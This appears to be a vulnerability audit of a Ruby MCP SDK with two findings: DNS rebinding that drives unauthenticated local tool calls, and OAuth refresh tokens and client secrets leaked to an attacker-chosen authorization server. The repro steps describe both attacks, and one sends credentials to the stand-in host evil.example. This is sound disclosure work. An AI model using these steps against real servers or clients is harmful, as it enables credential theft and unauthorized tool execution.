finding.claim: StreamableHTTPTransport never validates the Origin or Host header, so a DNS-rebinding page can drive an unauthenticated local MCP server and invoke tools.
finding.source: Any HTTP request whose Origin/Host is attacker-controlled, including a browser page on a rebound hostname that resolves to the server's loopback or private address.
finding.sink: tools/call dispatch: MCP::Server#call_tool (lib/mcp/server.rb:617-665) reached via handle_regular_request -> dispatch_handle_json.

trace.note: handle_request routes POST/GET/DELETE with no Origin/Host check.
handle_post runs Accept (528) and Content-Type (547) checks only; neither is an origin control.
initialize requests skip the session check entirely (no credential required).
handle_initialization mints a UUID session for any caller (652); no authentication.
handle_regular_request on the new session id (validate_and_touch_session only checks existence and expiry).
dispatch_handle_json -> server_session.handle_json -> Server#handle_request.
call_tool executes the registered tool handler.

finding.guards_checked: Accept header (528-539), Content-Type application/json (547-557), session id is an unguessable SecureRandom.uuid (652), MCP-Protocol-Version header (585-595). Case-insensitive grep of lib/ finds no Origin/Host handling anywhere. The SDK ships no authentication, so exploitability depends on the integrator binding to loopback or private interfaces and exposing side-effecting tools. The MCP transport spec says servers MUST validate Origin, so this is a spec gap.
finding.repro: Serve the Rack app on 127.0.0.1 with a tool that has side effects. From a page on an attacker-controlled hostname rebound to 127.0.0.1, POST {"jsonrpc":"2.0","id":1,"method":"initialize",...} with Accept: application/json, text/event-stream, then POST tools/call with the returned Mcp-Session-Id. The request is same-origin from the browser's view, so CORS preflight never applies.

finding.claim: The OAuth client sends stored refresh_token and client_secret, and may run dynamic registration, against an authorization server chosen by server-supplied PRM. Nothing binds that authorization server to the MCP server's origin or to an allowlist.
finding.source: The resource_metadata URL taken from the WWW-Authenticate header of a 401 or 403 from the MCP endpoint (lib/mcp/client/http.rb:465-470), and the authorization_servers[0] entry in the PRM document fetched from that URL (flow.rb:308-327).
finding.sink: Token-endpoint POST carrying the refresh_token form field and client credentials (flow.rb:661-669 -> 674-737; client_secret as Basic auth at 696, form body at 707). Also DCR POST at registration_endpoint (flow.rb:442-447).

trace.note: run_oauth_flow! is triggered by Faraday::UnauthorizedError from the MCP endpoint.
parse_www_authenticate_from_error reads the attacker-influenced resource_metadata param.
attempt_refresh -> flow.refresh!(server_url:, resource_metadata_url:).
refresh_token read from provider storage.
stored client_information (client_id and client_secret) loaded.
locate_authorization_server called with the attacker-supplied resource_metadata_url.
protected_resource_metadata_urls puts resource_metadata_url first in the probe list.
fetch_protected_resource_metadata GETs that URL (fetch_metadata_json, 333-367).
first authorization_servers entry checked only for https; no origin, allowlist, or same-host check.
issuer must equal the discovery URL; an attacker-hosted AS trivially satisfies this.
ensure_secure_endpoints! requires https token_endpoint only.
exchange_refresh_token posts refresh_token and client credentials to that AS.
client_secret sent as Basic auth to the attacker-chosen token_endpoint.

finding.guards_checked: HTTPS-only for resource_metadata and authorization_servers and token_endpoint (flow.rb:153-154, 237, 266; discovery.rb:181-194). Issuer equality (flow.rb:262), which the attacker satisfies by self-hosting. PRM resource coverage (flow.rb:513-525), which applies only when PRM supplies a resource field and is omitted by an attacker. OAuthURLGuard (http.rb:37-55, 354), which covers only MCP-endpoint requests, not flow's token requests, since flow.rb uses its own Faraday client (785-794). No allowlist, no origin binding between authorization_servers and server_url. Precondition: the client already holds a refresh_token or client_secret from a prior legitimate grant, and the MCP endpoint is hostile or compromised. A hostile server already sees the bearer token, so the marginal loss is the persistent refresh_token and client_secret.
finding.repro: Connect with an oauth provider holding a refresh_token for AS-A. Have the MCP URL return 401 with WWW-Authenticate: Bearer resource_metadata="https://evil.example/prm". evil.example serves {"authorization_servers":["https://evil.example"]} and https://evil.example/.well-known/oauth-authorization-server with issuer=https://evil.example and token_endpoint=https://evil.example/token. The SDK POSTs refresh_token and client_id/client_secret to evil.example/token.
